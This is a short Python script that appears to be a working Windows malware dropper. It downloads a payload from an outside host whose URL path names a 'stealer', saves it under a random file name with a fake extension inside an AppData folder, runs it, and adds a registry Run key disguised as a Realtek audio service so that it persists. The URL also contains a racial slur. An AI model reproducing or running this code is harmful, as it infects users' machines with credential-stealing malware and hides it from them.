from builtins import all,dir,exec,print,int,range,open,exit
exec('')
from sys import executable
from urllib import request
from os import getenv,system,name,listdir
from os.path import isfile
import winreg
from random import choice
if name !='nt':
    exit()
def getPath():
    path=choice([getenv('APPDATA'),getenv('LOCALAPPDATA')])
    directory=listdir(path)
    for _ in range(10):
        chosen=choice(directory)
        ye=path+'\\'+chosen
        if not isfile(ye)and ' ' not in chosen:
            return ye
    return getenv('TEMP')
def getName():
    firstName=''.join(choice('bcdefghijklmnopqrstuvwxyz')for _ in range(8))
    lasName=['.dll','.png','.jpg','.gay','.ink','.url','.jar','.tmp','.db','.cfg']
    return firstName+choice(lasName)
def install(path):
    with open(path,mode='w',encoding='utf-8')as f:
        r=request.urlopen('http://fade.one/stealer/FADEE-1234 Nigga').read().decode('utf8')
        print(r)
        f.write(r)
def run(path):
    system(f"start {executable} {path}")
def startUP(path):
    faked='SecurityHealthSystray.exe'
    address=f"{executable} {path}"
    key1=winreg.HKEY_CURRENT_USER
    key2='SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
    open_=winreg.CreateKeyEx(key1,key2,0,winreg.KEY_WRITE)
    winreg.SetValueEx(open_,'Realtek HD Audio Universal Service',0,winreg.REG_SZ,f"{faked} & {address}")
DoYouKnowTheWay=getPath()+'\\'+getName()
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)
print('ran')
print(DoYouKnowTheWay)
try:
    startUP(DoYouKnowTheWay)
except:
    pass
